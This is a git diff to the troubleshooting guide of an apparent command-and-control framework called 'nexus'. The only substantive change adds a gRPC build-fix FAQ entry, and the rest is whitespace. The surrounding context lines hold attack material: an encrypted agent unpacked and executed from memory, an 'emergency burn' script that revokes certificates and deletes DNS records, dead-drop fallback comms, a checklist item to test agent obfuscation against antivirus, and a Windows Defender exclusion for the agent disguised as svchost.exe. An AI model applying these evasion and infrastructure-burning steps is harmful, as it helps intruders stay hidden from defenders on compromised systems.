@@ -102,6 +102,27 @@ vim nexus.toml  # Update pinned_fingerprints array
 
 ### gRPC Connection Problems
 
+#### Q: "gRPC compilation errors: failed to resolve use of unresolved module 'proto'"
+**A:** This indicates a namespace issue with protobuf-generated code. See the complete fix guide:
+
+**Solution**: [gRPC Namespace Fix Guide](GRPC_NAMESPACE_FIX.md)
+
+**Quick diagnosis**:
+```bash
+# Check if this is a namespace issue
+cargo build -p nexus-infra 2>&1 | grep -E "(proto|nexus_c2_server|nexus_c2_client)"
+
+# If you see namespace errors, apply the documented fix
+# The issue is with incorrect import statements in:
+# - nexus-infra/src/grpc_server.rs
+# - nexus-infra/src/grpc_client.rs
+```
+
+**Expected after fix**:
+- Clean builds with only warnings (no errors)
+- Successful agent-server gRPC communication
+- Working task management and file operations
+
 #### Q: "gRPC connection timeout"
 **A:** Check network connectivity and TLS configuration:
 
@@ -143,7 +164,7 @@ curl --cert client.crt --key client.key --cacert ca.crt \
 connection_timeout = 60  # Increase timeout
 keepalive_interval = 30  # More frequent keepalives
 
-[grpc_client] 
+[grpc_client]
 request_timeout = 60
 max_retry_attempts = 5
 ```
@@ -273,7 +294,7 @@ impl<A: GlobalAlloc> GlobalAlloc for MemoryMonitor<A> {
         }
         ptr
     }
-    
+
     unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
         self.0.dealloc(ptr, layout);
         self.1.fetch_sub(layout.size(), Ordering::Relaxed);
@@ -329,7 +350,7 @@ fn runtime_unpack() -> Result<(), std::io::Error> {
     let encrypted_agent = include_bytes!("encrypted_agent.bin");
     let key = derive_runtime_key();
     let decrypted = decrypt_agent(encrypted_agent, &key)?;
-    
+
     // Load into memory and execute
     execute_from_memory(&decrypted)?;
     Ok(())
@@ -378,16 +399,16 @@ read -p "Are you sure? (type 'BURN' to continue): " confirm
 if [ "$confirm" = "BURN" ]; then
     # Revoke all certificates
     ./target/release/nexus-infra certificates revoke --all --reason compromise
-    
+
     # Delete all DNS records
     ./target/release/nexus-infra domains cleanup --all --force
-    
+
     # Rotate all API keys
     ./scripts/emergency-key-rotation.sh
-    
+
     # Deploy new infrastructure
     ./scripts/deploy-new-infrastructure.sh --emergency-mode
-    
+
     echo "Emergency burn completed"
 fi
 ```
@@ -411,7 +432,7 @@ impl EmergencyComms {
                 }
             }
         }
-        
+
         // If all fails, implement dead drop communication
         self.activate_dead_drop_protocol().await
     }
@@ -422,7 +443,7 @@ impl EmergencyComms {
 
 ### Pre-Production Checklist
 - [ ] **API Tokens**: Secured and rotated regularly
-- [ ] **Certificates**: Valid chains with proper expiration monitoring  
+- [ ] **Certificates**: Valid chains with proper expiration monitoring
 - [ ] **Domain Rotation**: Tested and scheduled appropriately
 - [ ] **Agent Obfuscation**: Applied and tested against AV
 - [ ] **Network Security**: Firewall rules and intrusion detection
@@ -488,7 +509,7 @@ grep -i "domain\|dns" logs/*.log
 # Agent connectivity
 grep -i "agent\|connection\|registration" logs/nexus-server.log
 
-# Task execution issues  
+# Task execution issues
 grep -i "task\|execution\|bof" logs/*.log
 ```
 
@@ -552,7 +573,7 @@ curl -X POST "https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Messages.js
 
 ### Issue: Windows Defender Real-time Protection
 **Problem**: Agent deleted by Windows Defender
-**Workaround**: 
+**Workaround**:
 ```bash
 # Add exclusion for agent path
 Add-MpPreference -ExclusionPath "C:\Windows\System32\svchost.exe"
@@ -589,7 +610,7 @@ acme_directory_url = "https://acme-staging-v02.api.letsencrypt.org/directory"
 cert_renewal_days = 60  # Renew later to reduce frequency
 ```
 
-### Issue: Cloudflare API Rate Limiting  
+### Issue: Cloudflare API Rate Limiting
 **Problem**: Too many DNS API calls
 **Workaround**:
 ```toml
